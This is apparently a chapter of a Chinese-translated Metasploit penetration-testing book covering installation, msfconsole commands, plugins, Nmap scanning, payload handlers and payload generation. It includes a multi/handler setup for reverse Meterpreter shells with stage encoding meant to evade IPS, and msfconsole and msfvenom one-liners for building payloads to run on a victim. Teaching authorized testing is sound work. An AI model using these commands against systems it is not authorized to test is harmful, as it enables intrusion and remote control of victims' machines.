“一种高级的、动态可扩展的有效载荷，使用内存中的 DLL 注入分段器，并在运行时通过网络进行扩展。它通过分段器套接字进行通信，并提供全面的客户端端 Ruby API。”

既然我们已经了解了基本术语，让我们看看如何安装 Metasploit 并设置它。

# 安装和设置 Metasploit

安装 Metasploit 非常容易，并且其设置过程受到不同操作系统的支持。Metasploit 可以安装在以下系统上：

+   *nix 系统（Ubuntu、macOS 等）

+   基于 Windows 的系统

安装 Metasploit 的步骤对所有支持的操作系统几乎是相同的。唯一的区别是在需要执行命令行安装时。

# 在*nix 上安装 Metasploit 框架

在我们开始使用 Metasploit 之前，我们需要安装它。按照以下步骤进行：

1.  在*nix 上安装 Metasploit 可以通过下载并执行适用于 Linux 和 macOS 系统的 Metasploit 夜间安装程序，或者使用以下命令（CLI）来完成：

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/de2445fd-1ed5-435b-bee7-ee1eb8ab1846.png)

前面的命令将下载一个 shell 脚本，该脚本将导入 Rapid7 签名密钥（PGP）并安装所有支持的 Linux 和 macOS 系统所需的软件包：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/aada9215-8ca3-447a-845b-78ffc7c2af5c.png)

1.  安装过程完成后，运行 Metasploit 非常简单。在终端中，只需输入以下命令：

```
msfconsole
```

下面的屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9469fb1a-0cfb-4458-b8e8-9297071fba55.png)

注意：Metasploit Framework v5.0.0 发布了许多新功能。您可以在[`blog.rapid7.com/2019/01/10/metasploit-framework-5-0-released/`](https://blog.rapid7.com/2019/01/10/metasploit-framework-5-0-released/)上查看这些功能和更多信息。

我们现在应该看到 Metasploit Framework 已经启动。当首次加载 MSF 控制台时，它会自动使用 PostgreSQL 创建一个数据库。如果我们执行扫描、利用等操作，该数据库将用于存储收集到的任何数据。

1.  每周都会向 Metasploit 添加新的利用和其他模块，因此定期更新 Metasploit 是一个很好的主意。可以使用以下命令来完成：

```
msfupdate
```

下面的屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8335fcb7-8b65-478e-b960-c33077b71274.png)

在撰写本书时，Metasploit Framework 提供了 1,991 个利用模块，1,089 个辅助模块，340 个后置模块，560 个有效载荷模块，45 个编码器模块，10 个 nops 和 7 个规避模块。

# 在 Windows 上安装 Metasploit Framework

现在我们已经学会了如何在*nix 系统上安装 Metasploit Framework，让我们快速看一下如何在 Windows 环境中安装 Metasploit Framework：

1.  首先，我们需要从以下 URL 下载 Windows 的 Nightly 安装程序：

```
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
```

输入此 URL 后，您应该看到以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/48aa3b71-1c3c-4dd3-89f8-c2dc7fbdedbf.jpg)

1.  下载完成后，我们可以通过双击 MSI 文件来安装它。一个新窗口将打开，如下面的屏幕截图所示。

1.  我们需要按照标准的安装步骤（下一步，下一步，我同意，然后安装）在 Windows 上安装 Metasploit：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b8b65933-889d-4d84-986f-21ed7ce6b261.png)

建议您阅读该工具的条款和条件。

安装完成后，我们仍然无法从命令提示符中运行 Metasploit，如下面的屏幕截图所示。这是因为路径变量尚未设置，因此系统不知道在执行命令时在哪里查找`msfconsole`二进制文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7f2f1c26-bbab-438b-aa92-316b4848e704.png)

1.  让我们找到`msfconsole`二进制文件。在我们的情况下，可以在这里找到：

```
C:\metasploit-framework\bin
```

前面命令的输出可以在下面的屏幕截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5a46c212-d447-4e42-9ca8-edc5cae6f507.png)

1.  现在，我们需要通过输入以下命令将此目录添加到我们的路径中：

```
set PATH=%PATH%;C:\metasploit-framework\bin
```

这可以在下面的屏幕截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0d57c333-3cf9-4003-a2f3-129f8c2871c4.png)

现在路径变量已经设置，我们将能够从命令提示符中启动 Metasploit：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/88b362fa-f3a7-493a-82aa-0b166584a2b8.png)

运行上述命令将启动 Metasploit 及其控制台。现在我们已经获得了对 MSF 控制台的访问权限，让我们开始了解 Metasploit Framework 的基础知识。

# 开始使用 Metasploit Framework

安装完成后，我们可以继续查看 Metasploit Framework 的使用。与 Metasploit Framework 进行交互的最常见方式是通过`msfconsole`。控制台提供了一个非常简单的命令行，用于进行高效的测试和利用（渗透）的所有功能和选项。

# 使用 msfconsole 与 Metasploit Framework 进行交互

您可以以**正常模式**或**安静模式**运行 MSF 控制台。这两种模式之间唯一的区别是控制台中没有错误、警告和横幅。在**正常模式**下，将出现一个很酷的 MSF 横幅。在**安静模式**下，您可以与 MSF 控制台交互，方法是执行`msfconsole -q`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ac349d1c-129e-4b9a-af85-30c9617b9d10.png)

根据您的情况和需求，还有其他可用的 MSF 控制台选项。例如，如果您想要在没有任何数据库支持的情况下运行 MSF 控制台，您可以随时执行`**msfconsole -qn**`命令。

如果数据库尚未初始化，则无法执行任何带有`db_`前缀的命令或加载任何插件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/eced6d9e-ee49-4221-a912-5b4c802f2ba8.png)

当您尝试从控制台加载插件时，您将收到以下未初始化错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5c27413c-019e-4692-964e-83799e621be9.png)

在这里，我们在`msfconsole`中使用了`-x`选项。正如你可能已经猜到的那样，这个开关用于在控制台内执行 MSF 支持的命令。我们还可以在控制台中执行 shell 命令，因为 Metasploit 会将这些命令传递给我们的默认 shell 以用作参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/bb4c5bfd-a538-4265-a2ee-0b38401ab879.png)

在上述命令中，我们从 MSF 控制台中回显了`WELCOME TO METASPLOIT FRAMEWORK`字符串并退出。要查看所有可用的选项，可以执行`msfconsole -h`命令。现在让我们来看看在 MSF 控制台中使用的最基本和最常用的命令。

# MSF 控制台命令

MSF 控制台命令可以分为以下几类：

+   **核心 MSF 控制台命令：**这些命令是在 MSF 控制台中使用的最常见和通用的命令。

+   **模块管理命令：**使用这些命令管理 MSF 模块。您可以使用这些命令编辑、加载、搜索和使用 Metasploit 模块。

+   **MSF 作业管理命令：**使用这些命令，您可以处理 Metasploit 模块作业操作，比如使用处理程序创建作业，列出后台运行的作业，杀死和重命名作业。

+   **资源脚本管理命令：**在使用资源脚本时，可以使用这些命令在控制台中执行脚本。您可以为执行提供一个存储的脚本文件，或者将在 MSF 控制台启动时使用的命令存储到文件中。

+   **后端数据库命令：**这些命令用于管理数据库；即检查 DB 连接，设置连接并断开连接，在 MSF 中还原/导入 DB，从 MSF 中备份/导出 DB，并列出与目标相关的保存信息。

+   **凭据管理命令：**您可以使用`creds`命令查看和管理保存的凭据。

+   **插件命令：**可以使用插件命令管理 MSF 控制台中的插件。这些命令适用于所有加载的插件。

要了解如何使用`msfconsole`命令，请参考以下网址：[`www.offensive-security.com/metasploit-unleashed/msfconsole-commands/`](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)。

MSF 控制台不仅允许我们利用其中的大量模块，还允许我们根据用户的需求自定义控制台。让我们看看如何自定义控制台。

# 自定义全局设置

在自定义控制台之前，我们需要了解当前（默认）应用于控制台的全局设置：

1.  当 Metasploit Framework 启动时，可以使用`show options`命令来完成这个操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1018936a-b8bf-4851-a831-126db557ae97.png)

1.  我们可以从这些设置中更改提示（`msf`文本）。要更改提示和提示字符，可以执行`set Prompt`和`set PromptChar`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4ebb5ead-06ad-41e9-a619-239e4266ed20.png)

1.  我们甚至可以使用一些扩展格式来配置更高级的提示，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b6f05a77-d1c3-4798-acf1-1c1a580b9475.png)

以下是可以使用的扩展格式：

| **文字** | **描述** |
| --- | --- |
| `％D` | 当前目录 |
| `％U` | 当前用户 |
| `％W` | 当前工作区 |
| `％T` | 当前时间戳 |
| `％J` | 当前运行的作业数 |
| `％S` | 当前打开的会话数 |
| `％L` | 本地 IP |
| `％H` | 主机名 |
| `％red` | 将颜色设置为红色 |
| `％grn` | 将颜色设置为绿色 |
| `％yel` | 将颜色设置为黄色 |
| `％blu` | 将颜色设置为蓝色 |
| `％mag` | 将颜色设置为洋红色 |
| `％cya` | 将颜色设置为青色 |
| `％whi` | 将颜色设置为白色 |
| `％blk` | 将颜色设置为黑色 |
| `％und` | 下划线 |
| `％bld` | 粗体 |

相同的格式也可以用于设置提示字符。

# MSF 中的变量操作

Metasploit Framework 中的变量操作可以帮助用户充分利用模块的功能。作为渗透测试人员，有时我们需要扫描大量目标，并且在几乎所有的测试场景中，我们都必须设置 Metasploit 模块所需的选项。这些选项，例如远程主机 IP/端口和本地主机 IP/端口，是为正在使用的特定 Metasploit 模块设置的。我们越早学习变量操作，就能越有效地使用模块。

可以使用数据存储来实现变量操作。数据存储是一种具有以下功能的变量类型：

+   以键/值对的形式存储数据

+   使 MSF 控制台能够在模块执行时配置设置

+   使 MSF 能够将值传递给其他模块内部

数据存储由各种类使用，以保存选项值和其他状态信息。有两种类型的数据存储：

+   **模块数据存储**：此数据存储仅保存与加载的模块相关的信息和选项（本地声明）。在 MSF 控制台中，您可以使用`set`命令保存模块选项，并使用`get`命令获取已保存的值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0aef2212-9ebd-44b6-b829-372bc36de379.png)

如前面的屏幕截图所示，加载了`smb_version`模块，并将`RHOSTS`选项设置为`192.168.2.17`。但是一旦我们卸载了模块（使用`back`命令），全局上就没有值来设置 RHOSTS 选项。要全局设置这些选项，我们需要使用全局数据存储。

+   **全局数据存储**：此数据存储将信息和选项保存到所有模块（全局声明）。在 MSF 控制台中，您可以使用`setg`命令保存模块选项，并使用`getg`命令获取：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fbb6bc1c-8c60-4c7d-81e4-89378a31bd93.png)

在前面的屏幕截图中，我们将值`192.168.2.17`全局保存在 RHOSTS 选项中，这意味着在使用另一个模块时将设置 RHOSTS 选项。如果使用`setg`，我们可以始终通过使用`get`或`getg`来检索数据。

在模块中只执行`set`命令将显示所有已保存的可用选项（用于模块数据存储和全局数据存储）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e06a6059-316a-4a62-a077-403487d71280.png)

在删除数据存储中的值的情况下，您可以始终使用`unset`和`unsetg`命令。

注意：如果使用`setg`全局设置选项，则无法使用`unset`命令将其删除。相反，您需要使用`unsetg`。

# 探索 MSF 模块

Metasploit Framework 中提供的所有选项和模块都可以使用`show`命令访问。让我们来看一下：

1.  要查看此命令的所有有效参数，您需要在 MSF 控制台中执行`show -h`命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/668ef9fe-1b22-4806-b056-8cd03047e982.png)

1.  要显示 Metasploit Framework 中可用的辅助功能，执行`show auxiliary`命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/abc3952c-eb84-4a26-b840-ad9b0aae2f42.png)

1.  相同的命令用于列出其他模块和特定于模块的参数。或者，您可以始终按两次键盘上的*Tab*按钮以查看`show`命令的可用参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/30e15b69-fd4f-4461-8ef5-50c9df89da06.png)

1.  对于特定于模块的参数，只需加载要使用的模块，然后在其中执行`show`命令。在这种情况下，我们使用了`smb_version`辅助模块，并按两次*Tab*按钮以查看`show`命令可用的所有参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4fad770a-cccf-465f-8180-aa47db7f7ebc.png)

1.  使用`show evasion`命令可以查看此特定模块可用的所有规避选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/566a293c-b45b-45a7-aa8b-e447cadb01df.png)

注意：这些选项通常用于绕过网络过滤终端，如入侵检测/预防系统（IDS/IPS）。

# 在 MSF 中运行 OS 命令

Metasploit Framework 的一个功能是我们可以从控制台执行普通的 shell 命令。您可以执行任何由您的 shell 支持的 shell 命令（bash/sh/zsh/csh）。在这种情况下，我们从控制台执行了`whoami && id`命令。命令已执行，并且结果显示在控制台本身中，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e4d22347-6d89-4b9b-a212-b1824791be7c.png)

我们还可以使用控制台中的交互式 bash 脚本，使用`/bin/bash -i`命令或者`/bin/bash`（`-i`开关用于以交互模式运行 bash）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/18447378-757f-4ef6-a80f-9d82447a96d6.png)

注意：要在 Windows 中获得交互式命令提示符，请在控制台中执行`cmd.exe`。

# 在 Metasploit Framework 中设置数据库连接

Metasploit Framework 最酷的功能之一是使用后端数据库来存储与目标相关的所有内容。在运行 MSF 时，按照以下步骤设置数据库：

1.  使用`db_status`命令从控制台检查数据库是否连接到 MSF，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0ebe2b05-1d67-4120-9127-65d9c6cf7b4a.png)

1.  如前面的屏幕截图所示，数据库尚未连接。我们可以通过使用数据库配置文件、一行命令或使用 RESTful HTTP API 数据服务（MSF 5 的新功能）来连接到数据库。默认情况下，不会有`database.yml`文件，但是您可以从`database.yml.example`文件中复制内容。您可以像这样编辑文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b44a48a3-9c19-4505-9f85-2efd7a683279.png)

注意：如果您不初始化和安装数据库，则此方法将无法工作。有关更多信息，请访问[`fedoraproject.org/wiki/Metasploit_Postgres_Setup`](https://fedoraproject.org/wiki/Metasploit_Postgres_Setup)。

1.  编辑并保存文件后，可以在`db_connect`命令中使用`-y`开关连接到数据库：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2ed60307-c7f8-4c1b-8ff4-3e82681942f5.png)

1.  让我们再次检查状态：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/823b95d2-8a0b-424b-98aa-80a218309723.png)

正如你所看到的，控制台现在已连接到后端数据库。

# 在 MSF 中加载插件

插件是 Metasploit Framework 中的扩展功能。它们用于通过利用 Ruby 语言的灵活性来扩展 MSF 的范围。这允许插件几乎可以做任何事情，从构建新的自动化功能到提供数据包级内容过滤以绕过 IDS/IPS。插件还可以用于集成第三方软件，如 Nessus、OpenVAS 和 Sqlmap 到框架中。按照以下步骤：

1.  要加载插件，您需要使用`load`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ff29b263-3386-47c7-a40a-42ca2257b63b.png)

1.  默认情况下，Metasploit 带有一些内置插件。在使用`load`命令后，可以通过按两次*Tab*按钮找到这些插件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7c21a5e0-a022-424d-acac-3fc0c33a7d6b.png)

注意：所有可用的内置插件都可以在此处找到：[`github.com/rapid7/metasploit-framework/tree/master/plugins`](https://github.com/rapid7/metasploit-framework/tree/master/plugins)

1.  通过在控制台中执行`**load openvas**`命令来加载 OPENVAS 插件。此插件将在后续章节中介绍：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4a7cb3bf-4765-4c4d-bfdb-2e0995a09519.png)

1.  插件成功加载后，您可以在控制台中执行`**help**`命令，并查找“OpenVAS Commands”以查看此特定插件的所有支持命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e8111ce0-6cb2-428d-8b8c-7d12d7644fde.png)

您可以通过将`.rb`插件文件复制到`<MSF_INSTALL_DIR>/plugins/`目录中，并使用插件名称执行`load`命令来加载自定义插件。

# 使用 Metasploit 模块

Metasploit 模块非常易于使用。简而言之，任何人都可以按照此过程熟悉模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8c958855-a745-4015-a57b-0cdad7f5fb09.png)

在这种情况下，让我们使用`smb_version`辅助模块：

1.  通过执行`use auxiliary/scanner/smb/smb_version`命令，我们已经在控制台中加载了模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d695097f-f4d8-4a79-8e93-9f009b17babf.png)

1.  现在，我们需要根据需要配置模块。可以使用`show options`命令查看`smb_version`的可用选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a3db2380-e5ec-4b3c-a96a-9735d28cec1d.png)

1.  我们可以使用`set/setg`命令来配置模块选项。`smb_version`的高级选项也可用，并且可以通过使用`show advanced`命令来显示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7464bfba-6a35-465e-828d-233aa27d0ad3.png)

1.  为了规避 IDS/IPS 端点，您可以为`smb_version`模块设置规避选项。使用`show evasion`命令列出此模块的所有支持的规避选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6bd9a927-0e7a-4e96-ba8e-da9ebe50d1a0.png)

1.  现在配置完成后，您可以通过执行`show missing`命令来最后一次检查缺少的选项，然后运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/74945709-afcd-48c5-b33f-eae315429a7d.png)

1.  在这种情况下，我们将在`192.168.2.17`中设置 RHOSTS，然后通过使用`run`命令或`execute`命令来执行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/86acd0eb-7f74-4358-8152-efa1d0cf9f88.png)

注意：除非已配置了所有必需的设置，否则模块将不会运行。

# 在 MSF 中搜索模块

在 Metasploit 中进行搜索非常容易。`search`命令接受用户的字符串值。如下截图所示，搜索`windows`字符串将列出所有用于 Windows 操作系统的模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d5f6f219-965c-4527-bd7e-ff41cff5bd2b.png)

Metasploit 搜索还允许我们根据模块类型进行搜索。例如，键入`**search windows type:exploit**`将显示所有 Windows 漏洞利用的列表。同样，我们可以定义 CVE。要搜索 2018 年发布的 Windows 漏洞利用，可以键入`search windows type:exploit cve:2018`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f038fa11-08fa-4feb-b0d3-067abb72ad1b.png)

接下来，我们将学习如何在 MSF 中检查主机和服务。

# 在 MSF 中检查主机和服务

到目前为止，我们已经介绍了`msfconsole`的基础知识。现在，让我们继续学习如何管理主机和服务：

1.  要查看已添加的所有主机的列表，请使用`hosts`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8ab73077-a357-46c6-8d63-4afbae32f675.png)

1.  要添加新主机，我们可以使用`hosts -a <IP>`命令，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0e03d157-7ade-463a-880c-25fa3b03224f.png)

1.  要删除主机，我们使用`hosts -d <IP>`命令，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9f5138ec-fede-4ef2-9b83-fc82bb916e57.png)

同样，`services`命令允许我们查看已添加到 Metasploit 的所有主机上可用的所有服务的列表。让我们来看一下：

1.  首先，我们需要使用`services`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/55ed767d-3862-4845-8fcf-9697db8f08d4.png)

1.  要查看单个主机的服务列表，我们可以使用`services <IP>`命令，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a3a70cb0-1ced-41d3-be13-2d735bc654e7.png)

我们不能一次添加多个端口。这样做会引发错误-需要精确一个端口-如前面的屏幕截图所示。

Metasploit 还允许我们使用`services -a -p <port number>`命令手动添加自定义服务，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/79b0677b-60a8-422a-86cf-cf01473981f9.png)

接下来，让我们看看使用 MSF 进行 Nmap 扫描。

# 使用 MSF 进行 Nmap 扫描

一旦我们将主机添加到 Metasploit 中，下一步就是扫描。Metasploit 具有 Nmap 的内置包装器，它在 Metasploit 控制台中为我们提供了与 Nmap 相同的功能。这个包装器的好处是它默认将输出保存在数据库中。

要对主机运行扫描，我们可以使用`db_nmap <IP>`命令。在这里，我们使用了`--open`标志来查看只打开的端口。`-v`用于详细，`-Pn`用于执行无 ping 扫描，`-sV`用于执行服务扫描，`-sC`用于针对发现的端口运行脚本扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a4ab6f0c-7f9f-4578-aac2-9cc7de3008d1.png)

以下屏幕截图显示了在主机上运行的扫描的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e62ce0f6-8b68-4d8c-9c30-2a65c3d68109.png)

Metasploit 还允许我们使用`db_import`将由 Nmap 完成的外部扫描导入其数据库：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cdf221b1-0e34-41c0-a562-fa2fbcb2c7cf.png)

目前，MSF 支持将数据导入其数据库的以下格式：Acunetix、Amap Log、Amap Log -m、Appscan、Burp Session XML、Burp Issue XML、CI、Foundstone、FusionVM XML、Group Policy Preferences Credentials、IP Address List、IP360 ASPL、IP360 XML v3、Libpcap Packet Capture、Masscan XML、Metasploit PWDump Export、Metasploit XML、Metasploit Zip Export、Microsoft Baseline Security Analyzer、NeXpose Simple XML、NeXpose XML Report、Nessus NBE Report、Nessus XML（v1）、Nessus XML（v2）、NetSparker XML、Nikto XML、Nmap XML、OpenVAS Report、OpenVAS XML、Outpost24 XML、Qualys Asset XML、Qualys Scan XML、Retina XML、Spiceworks CSV Export 和 Wapiti XML。

# 在 MSF 中设置有效载荷处理

在启动模块之前，我们需要设置处理程序。这个处理程序是一个存根，用于处理在 Metasploit Framework 之外启动的利用程序：

1.  通过输入`use exploit/multi/handler`命令加载处理程序模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5057728e-34b4-419d-8465-092a72472084.png)

1.  接下来，我们使用`show options`命令查看可用选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8153fb19-5943-4470-9900-2ab95f95fc92.png)

正如我们所看到的，选项目前为空。一旦我们定义了有效载荷，这些选项就会加载。例如，我们将在这里使用`windows/x64/meterpreter/reverse_tcp`有效载荷，并设置有效载荷的标准选项，如`LHOST`和`LPORT`。`stageencoder`和`enablestageencoding`选项被设置为对处理程序发送的第二阶段进行编码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/47236858-7ea1-4357-ac0b-e4b6683210fd.png)

首先，在选择编码器之前，我们设置`LHOST`和`LPORT`，该编码器将使用`shikata_ga_nai`编码器对分段器进行编码。我们使用分段器编码机制的原因是为了通过对分段器进行编码来绕过 IPSes/DPSes，从而在飞行中更改签名。

我们还需要通过将其值设置为`true`来启用阶段编码**。**此选项将使用我们选择的编码器启用第二阶段编码过程。设置了`stageencoding`选项后，执行`run -j`命令以在后台启动处理程序。

运行处理程序的另一种方法是使用控制台中可用的`handler`命令，并向其传递参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a7abc47f-b039-407f-990c-42c7447797d0.png)

因此，用于执行具有所有先前讨论的设置的处理程序的一行命令将是`handler -H <IP> -P <Port> -e <encoder> -p <payload>`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/013a1e1b-b7f0-4384-8019-ed26a55fe118.png)

接下来，我们将看一下 MSF 负载生成。

# MSF 负载生成

负载生成是 Metasploit Framework 中最有用的功能之一。从简单的 shellcode 生成到完全武装的 EXE/DLL 文件，Metasploit 可以在一条命令中生成。负载可以通过两种方式生成。

# 使用 msfconsole 生成 MSF 负载（一行命令）

通过使用 MSF 控制台并执行负载生成命令，您可以生成任何 MSF 支持的负载。使用此技术的一个优点是您不必单独启动负载处理程序。这可以通过一条命令完成。要生成负载并启动处理程序，请执行以下代码：

```
'msfconsole -qx "use <MSF supported payload>; set lhost<IP>; set lport <Port>; generate -f<Output File Format> -o<payload filename>; use exploit/multi/handler; set payload<MSF supported payload>; set lhost <IP>; set lport <Port>; run -j"'
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/98134196-af74-4fcc-b15c-c66e3ed8bf92.png)

上述命令将生成`reverse_https` Meterpreter 负载。列出它以确认生成的负载，并在端口`9090`上启动处理程序以进行传入连接。生成负载的另一种方法是使用 MSFvenom。

在上述命令中，使用`-q`开关以安静模式启动 MSF，`-x`在启动后在控制台中执行命令。

# 使用 msfvenom 生成 MSF 负载

MSFvenom 是一个内置工具，可以生成和混淆负载，无需启动 MSF。执行`msfvenom -p <MSF 支持的负载> lhost=<IP> lport=<PORT> -f <输出文件格式> -o <负载文件名>`命令以生成 EXE 格式的`reverse_https` Meterpreter 负载并保存文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/02196b7c-1a4f-4874-8072-fd907beb0113.png)

在这两种情况下，我们使用了`ls -alh https_2.exe`。

现在可以将此负载上传/执行到受害者系统上，以通过安全的 HTTPS 隧道与我们建立反向 Meterpreter 连接。

# 总结

在本章中，我们学习了 Metasploit Framework 的基本术语，以及如何在*nix 和基于 Windows 的系统上安装和设置它。然后，我们看了 MSF 的用法。我们加载了模块/辅助工具，设置了目标值，并对主机运行了它们。最后，我们学习了如何使用 MSFvenom 生成用于利用目的的负载。

在下一章中，我们将学习如何使用 Metasploit，但使用 Web 界面**用户交互**（**UI**）选项。这对于那些对**命令行界面**（**CLI**）不太了解的人来说真的很有帮助。

# 问题

1.  Metasploit Framework 可以免费使用吗？

1.  我可以加密我的负载以逃避反病毒软件吗？

1.  我正在使用 MySQL 作为我的渗透测试后端。我可以将 MySQL 或任何其他非 PostgreSQL 数据库与 Metasploit 集成吗？

1.  我有多个安装了 Metasploit Framework 的系统。我可以为每个 Metasploit 实例集中数据库吗？

# 进一步阅读

以下链接将帮助您了解更多关于 Metasploit 的信息，所有这些信息都来自其官方博客和文档：

+   [`www.offensive-security.com/metasploit-unleashed/`](https://www.offensive-security.com/metasploit-unleashed/)

+   [`resources.metasploit.com/`](http://resources.metasploit.com/)

+   [`metasploit.help.rapid7.com/docs`](https://metasploit.help.rapid7.com/docs)


# 第四章：Metasploit Web 界面

在上一章中，我们学习了 Metasploit Framework 的基础知识，并查看了一些我们可以在 Metasploit 中使用的功能。在本章中，我们将专注于 Metasploit Framework 的 Web 界面。该界面确实帮助那些对命令行界面（CLI）经验较少的用户。从侦察到报告，该界面让我们可以使用单个界面处理渗透测试的所有阶段。在本章中，我们将学习如何安装和使用 Metasploit Web 界面。稍后，我们将学习如何使用 Web 界面执行侦察并访问 Meterpreter 有效载荷。

在本章中，我们将涵盖以下主题：

+   Metasploit Web 界面简介

+   安装和设置 Web 界面

+   开始使用 Metasploit Web 界面

# 技术要求

以下是本章所需的技术要求：

+   具有 Metasploit Web 界面的 Metasploit 社区版（CE）

+   *nix 系统或 Microsoft Windows 系统

# Metasploit Web 界面简介

Metasploit Web 界面是一个基于浏览器的界面，提供了对导航菜单的轻松访问，并允许您更改任务的配置页面。您可以在 Metasploit Web 界面中执行在 Metasploit Framework（MSF）中执行的每个任务，从使用辅助程序执行发现扫描到弹出 Meterpreter。

